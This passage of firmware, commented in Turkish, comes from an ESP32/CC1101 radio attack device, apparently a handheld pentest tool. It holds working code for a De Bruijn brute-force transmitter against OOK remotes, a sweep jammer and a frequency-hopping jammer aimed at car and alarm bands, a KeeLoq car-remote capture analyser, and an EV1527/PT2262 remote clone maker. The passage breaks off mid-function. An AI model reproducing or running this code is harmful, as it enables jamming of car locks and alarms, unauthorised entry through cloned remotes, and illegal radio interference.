            // LFSR shift — taps: N=8: [8,6,5,4], N=10: [10,7], N=12: [12,11,10,4]
            uint8_t feedback;
            switch (N) {
                case  8: feedback = bit ^ ((lfsr>>2)&1) ^ ((lfsr>>3)&1) ^ ((lfsr>>4)&1); break;
                case 10: feedback = bit ^ ((lfsr>>3)&1); break;
                case 12: feedback = bit ^ ((lfsr>>1)&1) ^ ((lfsr>>2)&1) ^ ((lfsr>>8)&1); break;
                default: feedback = bit ^ ((lfsr>>1)&1); break;
            }
            lfsr = (lfsr >> 1) | ((uint16_t)feedback << (N - 1));
        }
    }

    // OOK parametresi: 1 bit = T_BIT µs
    // Alıcı baud'una göre ayarla
    uint16_t T_BIT_US = 1000; // 1ms/bit = 1kbps — çoğu kumanda için uygun
    uint16_t T_SYNC   = 8000; // sync gap

    dispClear(); dispStatusBar("De Bruijn BF");
    dispText(0, 12, String(N) + "-bit, " + String(seqLen) + " bit dizisi");
    dispText(0, 22, String(dbFreqs[fs], 2) + " MHz  OOK");
    dispText(0, 32, "Normal BF: " + String(seqLen) + " paket");
    dispText(0, 42, "De Bruijn: 1 uzun paket");
    dispText(0, 54, "BTN: basla LONG: cik");
    dispCommit();

    while (!readButton()) {
        if (readButtonLong()) return;
        delay(30);
    }

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_STX);
    delayMicroseconds(200);

    uint32_t passes    = 0;
    uint32_t lastDraw  = 0;

    while (!readButtonLong()) {
        // Sync gap (başlangıç)
        {
            uint8_t paOff[2] = {0x00, 0x00};
            cc1101_writeBurst(CC1101_PATABLE, paOff, 2);
            delayMicroseconds(T_SYNC);
        }
        // Tüm De Bruijn dizisini bit-bit gönder
        for (uint32_t i = 0; i < seqLen; i++) {
            if (i % 64 == 0 && readButtonLong()) goto deBruijnDone;
            uint8_t bit = (dbSeq[i / 8] >> (7 - (i % 8))) & 1;
            uint8_t paOn[2]  = {0x00, g_cc1101Power};
            uint8_t paOff[2] = {0x00, 0x00};
            cc1101_writeBurst(CC1101_PATABLE, bit ? paOn : paOff, 2);
            delayMicroseconds(T_BIT_US);
        }
        passes++;

        if (millis() - lastDraw > 400) {
            lastDraw = millis();
            uint32_t bitsTotal = passes * seqLen;
            dispClear(); dispStatusBar("De Bruijn BF");
            dispText(0, 12, "Tur: " + String(passes));
            dispText(0, 22, "Bit: " + String(bitsTotal));
            dispText(0, 32, String(N) + "-bit @ " + String(dbFreqs[fs], 2) + " MHz");
            dispText(0, 42, "T=" + String(T_BIT_US) + "us/bit");
            dispText(0, 54, "[LONG] dur");
            dispCommit();
        }
        delay(5);
    }

deBruijnDone:
    cc1101_strobe(CC1101_SIDLE);
    {
        uint8_t paFinal[2] = {0x00, g_cc1101Power};
        cc1101_writeBurst(CC1101_PATABLE, paFinal, 2);
    }
    logPush("[DEBRUIJN] N=" + String(N)
            + " passes=" + String(passes)
            + " freq=" + String(dbFreqs[fs], 2) + "MHz");
    dispBannerOK("De Bruijn bitti: " + String(passes) + " tur");
}

// ─── OOK/ASK Band Sweep Jammer ────────────────────────────
// Belirli bir frekans bandını süpürerek (sweep) o banttaki
// tüm OOK/ASK cihazları etkisiz kılar.
// Sabit frekans jammer'dan farkı: tek kanala kilitlenmez,
// tüm bandı tarar → bilinmeyen kanalları da etkiler.
// Parametreler:
//   startMHz / stopMHz : tarama aralığı
//   stepKHz            : kanal adımı (küçük = daha yavaş ama kapsamlı)
//   dwellMs            : her kanalda bekleme süresi
// CC1101 MDMCFG4'teki CHANBW 58kHz'e ayarlanır — geniş kanal
// maskeleme sağlar, adım başına ~1 kanal etkisi genişler.
static void cc1101_sweep_jammer_run() {
    if (!cc1101_ensureInit()) return;

    // Band seç
    OptionList bandOpts = {
        {"433.0-434.8 MHz (EU ISM)",  [](){}},   // 0
        {"868.0-870.0 MHz (EU SRD)",  [](){}},   // 1
        {"314.8-315.2 MHz (US Araç)", [](){}},   // 2
        {"426.0-436.0 MHz (Genis EU)",[](){}},   // 3
        {"Ozel Band",                 [](){}},   // 4
        {"Back",                      [](){}},
    };
    int bsel = loopOptions(bandOpts, "Sweep: Band");
    if (bsel < 0 || bsel == 5) return;

    struct BandDef { float start; float stop; uint16_t stepKHz; };
    static const BandDef BANDS[] = {
        {433.0f,  434.8f,  25},   // EU ISM 433: 72 adım @25kHz
        {868.0f,  870.0f,  25},   // EU SRD 868: 80 adım @25kHz
        {314.8f,  315.2f,  10},   // US araç: 40 adım @10kHz
        {426.0f,  436.0f,  50},   // Geniş EU: 200 adım @50kHz
        {433.0f,  434.8f,  25},   // Özel (aşağıda override edilir)
    };

    float startMHz  = BANDS[bsel].start;
    float stopMHz   = BANDS[bsel].stop;
    uint16_t stepKHz = BANDS[bsel].stepKHz;

    // Özel band: kullanıcı değeri seçsin
    if (bsel == 4) {
        OptionList startOpts = {
            {"433.0 MHz", [](){}}, {"433.5 MHz", [](){}},
            {"868.0 MHz", [](){}}, {"315.0 MHz", [](){}},
        };
        int ss = loopOptions(startOpts, "Baslangic Frek");
        if (ss < 0) return;
        static const float STARTS[] = {433.0f, 433.5f, 868.0f, 315.0f};
        startMHz = STARTS[ss];

        OptionList stopOpts = {
            {"+0.5 MHz",  [](){}}, {"+1.0 MHz",  [](){}},
            {"+2.0 MHz",  [](){}}, {"+5.0 MHz",  [](){}},
        };
        int es = loopOptions(stopOpts, "Bant Genisligi");
        if (es < 0) return;
        static const float WIDTHS[] = {0.5f, 1.0f, 2.0f, 5.0f};
        stopMHz = startMHz + WIDTHS[es];
    }

    // Dwell süresi seç
    OptionList dwellOpts = {
        {"5  ms/kanal (cok hizli)",  [](){}},
        {"15 ms/kanal (hizli)",      [](){}},
        {"30 ms/kanal (orta)",       [](){}},
        {"60 ms/kanal (kapsamli)",   [](){}},
        {"Back",                     [](){}},
    };
    int dsel = loopOptions(dwellOpts, "Dwell Suresi");
    if (dsel < 0 || dsel == 4) return;
    static const uint16_t DWELLS[] = {5, 15, 30, 60};
    uint16_t dwellMs = DWELLS[dsel];

    // Toplam kanal sayısı
    uint16_t totalCh = (uint16_t)((stopMHz - startMHz) * 1000.0f / stepKHz) + 1;

    // ── CC1101 Sweep TX modunu hazırla ─────────────────────
    // Geniş kanal filtresi: CHANBW = ~58kHz (E=1,M=0 → 26M/(4*4*2^1)=812kHz çok geniş)
    // Pratik değer: MDMCFG4 = 0x6C → CHANBW_E=1,CHANBW_M=2 → ~203kHz
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_writeReg(CC1101_MDMCFG4, 0x6C);   // BW ~203kHz — geniş sweep maskesi
    cc1101_writeReg(CC1101_PKTCTRL0, 0x32);  // sonsuz paket modu
    cc1101_writeReg(CC1101_IOCFG0,   0x2E);  // GDO0 tri-state

    uint8_t paMax[8];
    memset(paMax, g_cc1101Power, 8);
    cc1101_writeBurst(CC1101_PATABLE, paMax, 8);

    dispClear(); dispStatusBar("SWEEP JAMMER");
    dispText(0, 12, String(startMHz, 1) + " - " + String(stopMHz, 1) + " MHz");
    dispText(0, 22, "Adim: " + String(stepKHz) + " kHz");
    dispText(0, 32, "Dwell: " + String(dwellMs) + " ms");
    dispText(0, 42, "Kanal: " + String(totalCh));
    dispText(0, 54, "[LONG] durdur");
    dispCommit();
    delay(900);

    uint32_t sweepCount = 0;   // tamamlanan tam tarama sayısı
    uint32_t pktCount   = 0;   // gönderilen gürültü burst sayısı
    uint32_t lastDraw   = 0;
    float    curMHz     = startMHz;
    bool     goUp       = true; // ileri-geri (ping-pong) tarama

    cc1101_setFrequency(startMHz);
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_STX);

    uint32_t dwellStart = millis();

    while (!readButtonLong()) {
        // Gürültü burst TX FIFO'ya yaz
        uint8_t noiseBuf[48];
        for (uint8_t i = 0; i < 48; i++) noiseBuf[i] = (uint8_t)esp_random();
        cc1101_writeBurst(CC1101_TXFIFO, noiseBuf, 48);

        // TXFIFO underflow kontrolü
        uint8_t marc = cc1101_readStatus(CC1101_MARCSTATE) & 0x1F;
        if (marc == 0x16) {
            cc1101_strobe(CC1101_SFTX);
            cc1101_strobe(CC1101_STX);
        }
        pktCount++;

        // Dwell süresi doldu mu? → sonraki kanala geç
        if (millis() - dwellStart >= dwellMs) {
            dwellStart = millis();

            // Ping-pong sweep: önce ileri, sonra geri
            float nextMHz = curMHz + (goUp ? 1.0f : -1.0f) * (stepKHz / 1000.0f);

            if (goUp && nextMHz > stopMHz) {
                goUp    = false;
                nextMHz = stopMHz;
                sweepCount++;
            } else if (!goUp && nextMHz < startMHz) {
                goUp    = true;
                nextMHz = startMHz;
                sweepCount++;
            }

            curMHz = nextMHz;
            cc1101_strobe(CC1101_SIDLE);
            cc1101_setFrequency(curMHz);
            cc1101_strobe(CC1101_STX);
        }

        // Ekran güncelle (her 280ms)
        if (millis() - lastDraw > 280) {
            lastDraw = millis();
            dispClear(); dispStatusBar("!!! SWEEP !!!");

            // Frekans göstergesi
            dispText(0, 10, String(curMHz, 3) + " MHz");

            // Sweep progress bar
            float prog = (curMHz - startMHz) / (stopMHz - startMHz);
            if (!goUp) prog = 1.0f - prog;
            uint8_t barW = (uint8_t)(prog * (OLED_W - 4));
            display.drawRect(2, 22, OLED_W - 4, 7, SSD1306_WHITE);
            display.fillRect(2, 22, barW, 7, SSD1306_WHITE);

            dispText(0, 32, "Tarama: " + String(sweepCount));
            dispText(0, 42, "Burst:  " + String(pktCount));

            // Yön oku animasyonu
            dispText(96, 32, goUp ? ">>>" : "<<<");

            dispText(0, 56, "[LONG] durdur");
            dispCommit();
        }

        delayMicroseconds(300);
    }

    // Temizlik
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SFTX);
    uint8_t paTable[8] = {0x00, g_cc1101Power, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    cc1101_writeBurst(CC1101_PATABLE, paTable, 8);
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);
    // MDMCFG4'ü varsayılana döndür
    cc1101_writeReg(CC1101_MDMCFG4, 0xF8);

    logPush("[SWEEP_JAM] sweeps=" + String(sweepCount)
            + " bursts=" + String(pktCount)
            + " band=" + String(startMHz, 1) + "-" + String(stopMHz, 1) + "MHz"
            + " step=" + String(stepKHz) + "kHz"
            + " dwell=" + String(dwellMs) + "ms");
    dispBannerOK("Sweep bitti: " + String(sweepCount) + " tam tur");
}

// ─── 14. Frequency Hopper Jammer ──────────────────────────
// Birden fazla Sub-GHz frekansı hızla atlayarak geniş bant
// karıştırma yapar. Her frekansta kısa süre gürültü yayar.
static void cc1101_freqhop_jammer_run() {
    if (!cc1101_ensureInit()) return;

    // Hop seti seç
    OptionList hopOpts = {
        {"EU Araç/Alarm (4 band)",   [](){}},  // 433.42/433.92/434.42/434.92
        {"EU Genis (6 band)",         [](){}},  // yukarıdaki + 868.30/868.95
        {"US Araç (3 band)",          [](){}},  // 314.9/315.0/315.1
        {"Ozel (433+868+315)",        [](){}},  // karma
        {"Back",                      [](){}},
    };
    int hs = loopOptions(hopOpts, "Hop Jammer: Set");
    if (hs < 0 || hs == 4) return;

    static const float hopSets[4][8] = {
        {433.42f, 433.92f, 434.42f, 434.92f, 0,      0,      0,      0},
        {433.42f, 433.92f, 434.42f, 434.92f, 868.30f,868.95f,0,      0},
        {314.90f, 315.00f, 315.10f, 0,       0,      0,      0,      0},
        {315.00f, 433.92f, 434.42f, 868.30f, 0,      0,      0,      0},
    };
    static const uint8_t hopCounts[4] = {4, 6, 3, 4};

    const float*  freqs    = hopSets[hs];
    uint8_t       numFreqs = hopCounts[hs];

    // Hop süresi seç
    OptionList durOpts = {
        {"20 ms/kanal (hizli)",  [](){}},
        {"50 ms/kanal (orta)",   [](){}},
        {"100 ms/kanal (yavas)", [](){}},
        {"Back",                 [](){}},
    };
    int ds = loopOptions(durOpts, "Hop Suresi");
    if (ds < 0 || ds == 3) return;
    uint16_t hopDurMs = (ds == 0) ? 20 : (ds == 1) ? 50 : 100;

    // CC1101 jammer modunu ayarla
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_writeReg(CC1101_PKTCTRL0, 0x32);
    cc1101_writeReg(CC1101_IOCFG0,   0x2E);
    uint8_t paMax[8];
    memset(paMax, g_cc1101Power, 8);
    cc1101_writeBurst(CC1101_PATABLE, paMax, 8);

    dispClear(); dispStatusBar("HOP JAMMER");
    dispText(0, 14, String(numFreqs) + " kanal, " + String(hopDurMs) + "ms/hop");
    dispText(0, 26, "Guc: MAX (+12 dBm)");
    dispText(0, 38, "OOK gurultu TX");
    dispText(0, 52, "[LONG] durdur");
    dispCommit();
    delay(800);

    uint8_t  curIdx    = 0;
    uint32_t hopCount  = 0;
    uint32_t lastDraw  = 0;
    uint32_t hopStart  = millis();

    cc1101_setFrequency(freqs[0]);
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_STX);

    while (!readButtonLong()) {
        // Gürültü burst gönder
        uint8_t noiseBuf[32];
        for (uint8_t i = 0; i < 32; i++) noiseBuf[i] = (uint8_t)esp_random();
        cc1101_writeBurst(CC1101_TXFIFO, noiseBuf, 32);

        // TXFIFO underflow kontrolü
        uint8_t marc = cc1101_readStatus(CC1101_MARCSTATE) & 0x1F;
        if (marc == 0x16) {
            cc1101_strobe(CC1101_SFTX);
            cc1101_strobe(CC1101_STX);
        }

        // Hop zamanı geldi mi?
        if (millis() - hopStart >= hopDurMs) {
            hopStart = millis();
            curIdx   = (curIdx + 1) % numFreqs;
            hopCount++;
            cc1101_strobe(CC1101_SIDLE);
            cc1101_setFrequency(freqs[curIdx]);
            cc1101_strobe(CC1101_STX);
        }

        if (millis() - lastDraw > 250) {
            lastDraw = millis();
            dispClear(); dispStatusBar("!!! HOP JAM !!!");
            dispText(0, 12, "Frek: " + String(freqs[curIdx], 2) + " MHz");
            dispText(0, 22, "Hop: " + String(hopCount));
            dispText(0, 32, "Kanal " + String(curIdx + 1) + "/" + String(numFreqs));
            // Görsel hop göstergesi
            uint8_t barW = (OLED_W / numFreqs);
            for (uint8_t i = 0; i < numFreqs; i++) {
                if (i == curIdx)
                    display.fillRect(i * barW, 42, barW - 1, 8, SSD1306_WHITE);
                else
                    display.drawRect(i * barW, 42, barW - 1, 8, SSD1306_WHITE);
            }
            dispText(0, 54, "[LONG] durdur");
            dispCommit();
        }
        delayMicroseconds(200);
    }

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SFTX);
    uint8_t paTable[8] = {0x00, g_cc1101Power, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    cc1101_writeBurst(CC1101_PATABLE, paTable, 8);
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);
    logPush("[HOPJAM] hops=" + String(hopCount)
            + " freqs=" + String(numFreqs)
            + " dur=" + String(hopDurMs) + "ms");
    dispBannerOK("Hop Jammer bitti: " + String(hopCount) + " hop");
}

// ─── 15. KeeLoq Analiz ────────────────────────────────────
// KeeLoq: Microchip HCS301/300/320 kullanan araç kumandası
// rolling code protokolü. Bu fonksiyon:
// - Ham sinyali yakalar ve pulse'ları decode eder
// - Preamble, header, encryption block, serial# ayırır
// - Discrimination bits (low fixed bits) analiz eder
// - Tekrar yakalamada counter artışını takip eder
// Not: Rolling code kırma mümkün değildir; sadece yapısal analiz.
static void cc1101_keeloq_run() {
    if (!cc1101_ensureInit()) return;

    // KeeLoq için doğru frekansı al
    OptionList freqOpts = {
        {"433.92 MHz (EU)",  [](){}},
        {"315.00 MHz (US)",  [](){}},
        {"434.42 MHz",       [](){}},
        {"Back",             [](){}},
    };
    int fs = loopOptions(freqOpts, "KeeLoq: Frek");
    if (fs < 0 || fs == 3) return;
    float klFreqs[] = {433.92f, 315.0f, 434.42f};
    cc1101_setFrequency(klFreqs[fs]);
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setBaudRate(2400); // KeeLoq = ~2.4 kbaud nominal

    // KeeLoq paket yapısı (HCS301 örneği):
    // Preamble : 23 bit alternatif 1/0
    // Header   : 1 bit "1" (sync)
    // Encrypted: 32 bit (hopping code)
    // Serial   : 28 bit (fixed, manufacturer-assigned)
    // Button   :  4 bit (S1S2S3S4 switch state)
    // --- Toplam: 88 bit ---
    // Kodlama: PWM — "0" = 1T HIGH + 2T LOW, "1" = 2T HIGH + 1T LOW
    // T ≈ 400 µs (nominal)

    struct KeeLoqPacket {
        uint32_t encrypted;   // 32-bit hopping code
        uint32_t serial;      // 28-bit serial number
        uint8_t  button;      // 4-bit button state
        uint8_t  counter;     // alt 8-bit sayaç (encrypted'dan)
        uint8_t  discBits;    // alt 4 fixed bits (discrimination)
        uint8_t  preambleLen; // yakalanan preamble bit sayısı
        uint8_t  totalBits;
        bool     valid;
    };

    static KeeLoqPacket prevPkt = {};
    uint8_t  captureCount = 0;

    dispClear(); dispStatusBar("KeeLoq Analiz");
    dispText(0, 12, "Frek: " + String(klFreqs[fs], 2) + " MHz");
    dispText(0, 22, "Protokol: HCS300/301");
    dispText(0, 32, "Kumandayi bas...");
    dispText(0, 44, "LONG: cik");
    dispCommit();

    // CC1101'i RX moduna al, carrier sense bekle
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);

    while (!readButtonLong()) {
        // Carrier sense: GDO0 HIGH → sinyal var
        uint32_t waitT = millis();
        while (digitalRead(PIN_CC1101_GDO0) == LOW) {
            if (readButtonLong()) { cc1101_strobe(CC1101_SIDLE); return; }
            if (millis() - waitT > 8000) {
                dispBannerWarn("Sinyal yok (8s)");
                cc1101_strobe(CC1101_SIDLE);
                return;
            }
            delay(1);
        }

        // Pulse yakala
        g_rfCaptureLen = 0;
        bool     lastLvl = (digitalRead(PIN_CC1101_GDO0) == HIGH);
        uint32_t lastUs  = micros();
        uint32_t cStart  = millis();

        while (millis() - cStart < 200 && g_rfCaptureLen < CC_CAPTURE_MAX - 1) {
            bool cur = (digitalRead(PIN_CC1101_GDO0) == HIGH);
            if (cur != lastLvl) {
                uint32_t now = micros();
                uint32_t dur = now - lastUs;
                if (dur > 50) { // gürültü filtresi
                    g_rfCapture[g_rfCaptureLen++] = {(uint16_t)min(dur, (uint32_t)65000), lastLvl};
                }
                lastLvl = cur; lastUs = now;
            }
            if (g_rfCaptureLen > 10 && micros() - lastUs > 15000) break; // paket sonu
        }
        cc1101_strobe(CC1101_SIDLE);

        if (g_rfCaptureLen < 20) {
            dispBannerWarn("Cok kisa paket, tekrar...");
            delay(500);
            cc1101_strobe(CC1101_SRX);
            continue;
        }

        // KeeLoq decode
        // T hesapla: en kısa pulse T, 2T = uzun pulse
        uint32_t minDur = 0xFFFF;
        for (uint16_t i = 0; i < g_rfCaptureLen; i++)
            if (g_rfCapture[i].dur > 100 && g_rfCapture[i].dur < minDur)
                minDur = g_rfCapture[i].dur;
        uint32_t T     = minDur;
        uint32_t T_THR = T + T / 2; // 1.5T threshold

        // Preamble bul (uzun dizi alterne HIGH/LOW)
        uint16_t dataStart = 0;
        uint8_t  preambleCount = 0;
        for (uint16_t i = 0; i < g_rfCaptureLen - 1; i++) {
            if (g_rfCapture[i].dur < T_THR && g_rfCapture[i + 1].dur < T_THR) {
                preambleCount++;
            } else {
                if (preambleCount >= 10) { dataStart = i; break; }
                preambleCount = 0;
            }
        }

        // Data bitlerini decode et (PWM)
        // "0" = kısa HIGH + uzun LOW
        // "1" = uzun HIGH + kısa LOW
        uint64_t rawBits = 0;
        uint8_t  bitCount = 0;
        for (uint16_t i = dataStart; i + 1 < g_rfCaptureLen && bitCount < 64; i += 2) {
            uint32_t hiDur = g_rfCapture[i].level     ? g_rfCapture[i].dur : g_rfCapture[i + 1].dur;
            uint32_t loDur = g_rfCapture[i].level     ? g_rfCapture[i + 1].dur : g_rfCapture[i].dur;
            (void)loDur;
            uint8_t bit = (hiDur >= T_THR) ? 1 : 0;
            rawBits = (rawBits << 1) | bit;
            bitCount++;
        }

        // KeeLoq paket ayrıştır (MSB first, 64 bit = 32 enc + 28 ser + 4 btn)
        KeeLoqPacket pkt = {};
        pkt.totalBits    = bitCount;
        pkt.preambleLen  = preambleCount;
        if (bitCount >= 64) {
            pkt.encrypted = (uint32_t)(rawBits >> 32);
            pkt.serial    = (uint32_t)(rawBits >> 4) & 0x0FFFFFFF;
            pkt.button    = (uint8_t)(rawBits & 0x0F);
            pkt.discBits  = (uint8_t)(pkt.encrypted & 0x0F);       // alt 4 bit sabit
            pkt.counter   = (uint8_t)((pkt.encrypted >> 16) & 0xFF); // tahmini sayaç yeri
            pkt.valid     = true;
        } else {
            pkt.valid = false;
        }

        captureCount++;

        // Gösterim
        dispClear(); dispStatusBar("KeeLoq #" + String(captureCount));
        if (pkt.valid) {
            char encHex[10], serHex[10];
            snprintf(encHex, sizeof(encHex), "%08X", pkt.encrypted);
            snprintf(serHex, sizeof(serHex), "%07X", pkt.serial);
            dispText(0, 10, "Enc: 0x" + String(encHex));
            dispText(0, 20, "Ser: 0x" + String(serHex));
            dispText(0, 30, "Btn: " + String(pkt.button, BIN)
                            + "  Disc: " + String(pkt.discBits, HEX));

            // Önceki paketle karşılaştır
            if (prevPkt.valid && prevPkt.serial == pkt.serial) {
                dispText(0, 40, "Ctr delta: +" +
                    String((int16_t)(pkt.counter - prevPkt.counter)));
                dispText(0, 50, "Enc degisti: " +
                    String(pkt.encrypted != prevPkt.encrypted ? "EVET" : "HAYIR"));
            } else {
                dispText(0, 40, "T=" + String(T) + "us bits=" + String(bitCount));
                dispText(0, 50, "Pre=" + String(preambleCount));
            }
        } else {
            dispText(0, 18, "Decode hatasi!");
            dispText(0, 28, "Bits: " + String(bitCount));
            dispText(0, 38, "T=" + String(T) + " us");
            dispText(0, 48, "Pulses: " + String(g_rfCaptureLen));
        }
        dispCommit();

        prevPkt = pkt;

        // Kaydet / devam et menüsü
        OptionList actOpts = {
            {"Tekrar Dinle",  [](){}},
            {"SD Kaydet",     [](){}},
            {"Back",          [](){}},
        };
        int asel = loopOptions(actOpts, "KeeLoq Islem");
        if (asel == 1) {
            String fname = "keeloq_" + String(millis() / 1000);
            rf_capture_save(fname);
            if (pkt.valid) {
                logPush("[KEELOQ] enc=0x" + String(pkt.encrypted, HEX)
                        + " ser=0x" + String(pkt.serial, HEX)
                        + " btn=" + String(pkt.button)
                        + " disc=" + String(pkt.discBits));
            }
            dispBannerOK("Kaydedildi: " + fname);
        } else if (asel != 0) {
            break;
        }

        // Tekrar için RX'e dön
        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_SRX);
        dispClear(); dispStatusBar("KeeLoq Analiz");
        dispText(0, 16, "#" + String(captureCount) + " yakalandi");
        dispText(0, 28, "Sonraki kumanda...");
        dispText(0, 40, "LONG: cik");
        dispCommit();
    }

    cc1101_strobe(CC1101_SIDLE);
    logPush("[KEELOQ] total=" + String(captureCount) + " frames");
    dispBannerOK("KeeLoq bitti: " + String(captureCount) + " frame");
}

// ─── 17. EV1527 / PT2262 Clone Maker ─────────────────────
// Yakalanan sinyali EV1527 veya PT2262 protokolüne göre
// decode eder, adres+data bitlerini gösterir ve SD'ye
// kaydedilmiş clone sinyali üretir. Sonrasında tekrar
// gönderme için BF Replay ile kullanılabilir.
static void cc1101_ev1527_clone_run() {
    if (!cc1101_ensureInit()) return;

    // ── Adım 1: kaynak seç ──────────────────────────────
    OptionList srcOpts = {
        {"Yeni Yakala",     [](){}},
        {"Dosyadan Yukle",  [](){}},
        {"Back",            [](){}},
    };
    int src = loopOptions(srcOpts, "EV1527 Clone: Kaynak");
    if (src < 0 || src == 2) return;

    if (src == 0) {
        // Yakala
        OptionList freqOpts = {
            {"433.92 MHz", [](){}},
            {"315.00 MHz", [](){}},
            {"434.42 MHz", [](){}},
            {"Back",       [](){}},
        };
        int fs = loopOptions(freqOpts, "Frekans");
        if (fs < 0 || fs == 3) return;
        float fq[] = {433.92f, 315.0f, 434.42f};
        cc1101_setFrequency(fq[fs]);
        cc1101_setModulation(CC_MOD_ASKOOK);
        cc1101_writeReg(CC1101_IOCFG0, 0x0D);
        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_SRX);

        dispClear(); dispStatusBar("EV1527 Yakala");
        dispText(0, 16, "Kumandayi bas...");
        dispText(0, 28, String(fq[fs], 2) + " MHz");
        dispText(0, 44, "LONG: iptal");
        dispCommit();

        // Carrier bekle
        uint32_t wt = millis();
        while (digitalRead(PIN_CC1101_GDO0) == LOW) {
            if (readButtonLong()) { cc1101_strobe(CC1101_SIDLE); return; }
            if (millis() - wt > 10000) {
                dispBannerWarn("Sinyal yok!");
                cc1101_strobe(CC1101_SIDLE); return;
            }
            delay(1);
        }
        // Pulse yakala
        g_rfCaptureLen = 0;
        bool     lv  = (digitalRead(PIN_CC1101_GDO0) == HIGH);
        uint32_t lu  = micros();
        uint32_t ct  = millis();
        while (millis() - ct < 300 && g_rfCaptureLen < CC_CAPTURE_MAX - 1) {
            bool cv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
            if (cv != lv) {
                uint32_t now = micros();
                uint32_t dur = now - lu;
                if (dur > 50) g_rfCapture[g_rfCaptureLen++] = {(uint16_t)min(dur,(uint32_t)65000), lv};
                lv = cv; lu = now;
            }
            if (g_rfCaptureLen > 8 && micros() - lu > 20000) break;
        }
        cc1101_strobe(CC1101_SIDLE);
        if (g_rfCaptureLen < 10) { dispBannerWarn("Cok az pulse!"); return; }
    } else {
        // Dosyadan yükle
        std::vector<String> files = rf_capture_list();
        if (files.empty()) { dispBannerWarn("Dosya yok!"); return; }
        OptionList fo;
        for (auto& f : files) {
            String sn = f;
            if (sn.startsWith("spiffs:")) sn = "[S]" + sn.substring(sn.lastIndexOf('/')+1);
            else if (sn.startsWith("sd:"))  sn = "[D]" + sn.substring(sn.lastIndexOf('/')+1);
            if (sn.endsWith(".bin")) sn = sn.substring(0, sn.length()-4);
            if (sn.length() > 17)   sn = sn.substring(0, 16) + "~";
            fo.push_back({sn, [](){}});
        }
        fo.push_back({"Back", [](){}});
        int fsel = loopOptions(fo, "EV1527: Dosya");
        if (fsel < 0 || fsel == (int)fo.size()-1) return;
        if (!rf_capture_load(files[fsel])) { dispBannerErr("Yuklenemedi!"); return; }
    }

    // ── Adım 2: T süresi hesapla ───────────────────────
    // EV1527: preamble = 1T HIGH + 31T LOW, bit "0" = 1T H + 3T L, bit "1" = 3T H + 1T L
    // PT2262: preamble = 1T HIGH + 31T LOW, bit "0" = 1T H + 3T L, bit "F" = 1T H + 1T L
    // T ≈ 350–650 µs yaygın değer
    uint32_t minDur = 0xFFFF;
    for (uint16_t i = 0; i < g_rfCaptureLen; i++)
        if (g_rfCapture[i].dur > 80 && g_rfCapture[i].dur < (uint32_t)minDur)
            minDur = g_rfCapture[i].dur;
    uint32_t T = minDur;
    if (T < 100 || T > 2000) T = 350; // güvenli default

    // ── Adım 3: protokol seç / tahmin et ───────────────
    // Sync pulse'u bul: uzun LOW (>20T)
    uint16_t dataStart = 0;
    for (uint16_t i = 0; i < g_rfCaptureLen - 1; i++) {
        if (!g_rfCapture[i].level && g_rfCapture[i].dur > T * 15) {
            dataStart = i + 1; break;
        }
    }

    // ── Adım 4: bit decode (EV1527 PWM) ────────────────
    // "0" → 1T HIGH + 3T LOW   (HIGH kısa)
    // "1" → 3T HIGH + 1T LOW   (HIGH uzun)
    uint32_t rawCode  = 0;
    uint8_t  bitCount = 0;
    uint32_t thr      = T + T / 2; // 1.5T eşiği

    for (uint16_t i = dataStart; i + 1 < g_rfCaptureLen && bitCount < 24; i += 2) {
        // İlk pulse HIGH olmalı
        uint16_t hiDur = g_rfCapture[i].level     ? g_rfCapture[i].dur : g_rfCapture[i+1].dur;
        uint8_t  bit   = (hiDur > thr) ? 1 : 0;
        rawCode = (rawCode << 1) | bit;
        bitCount++;
    }

    // EV1527: 20-bit adres + 4-bit data
    uint32_t address = (rawCode >> 4) & 0x000FFFFF;
    uint8_t  dataBits = rawCode & 0x0F;

    // ── Adım 5: Sonucu göster ───────────────────────────
    dispClear(); dispStatusBar("EV1527 Decode");
    char addrHex[8], dataHex[4];
    snprintf(addrHex, sizeof(addrHex), "%05X", address);
    snprintf(dataHex, sizeof(dataHex), "%X",   dataBits);
    dispText(0, 10, "Adres: 0x" + String(addrHex));
    dispText(0, 20, "Data:  0x" + String(dataHex)
                  + "  (" + String(dataBits, BIN) + ")");
    dispText(0, 30, "Bits:  " + String(bitCount));
    dispText(0, 40, "T:     " + String(T) + " us");
    dispText(0, 52, "BTN: clone yap  LONG: cik");
    dispCommit();

    if (readButtonLong()) return;
    while (!readButton()) {
        if (readButtonLong()) return;
        delay(20);
    }

    // ── Adım 6: Clone sinyali üret ve SD'ye kaydet ─────
    // Temiz EV1527 pulse dizisi yeniden oluştur
    static RFPulse clonePulses[200];
    uint16_t cp = 0;

    // Preamble: 1T HIGH + 31T LOW
    clonePulses[cp++] = {(uint16_t)T,        true};
    clonePulses[cp++] = {(uint16_t)(T * 31), false};

    // 24 bit data (20-bit adres MSB first + 4-bit data)
    for (int8_t b = 23; b >= 0 && cp + 2 < 198; b--) {
        uint8_t bit = (rawCode >> b) & 1;
        if (bit) {
            clonePulses[cp++] = {(uint16_t)(T * 3), true};
            clonePulses[cp++] = {(uint16_t)T,       false};
        } else {
            clonePulses[cp++] = {(uint16_t)T,       true};
            clonePulses[cp++] = {(uint16_t)(T * 3), false};
        }
    }
    // Son sync gap
    clonePulses[cp++] = {(uint16_t)T,        true};
    clonePulses[cp++] = {(uint16_t)(T * 31), false};

    // g_rfCapture'a klonu kopyala
    memcpy(g_rfCapture, clonePulses, cp * sizeof(RFPulse));
    g_rfCaptureLen = cp;

    // SD'ye kaydet
    bool saved = false;
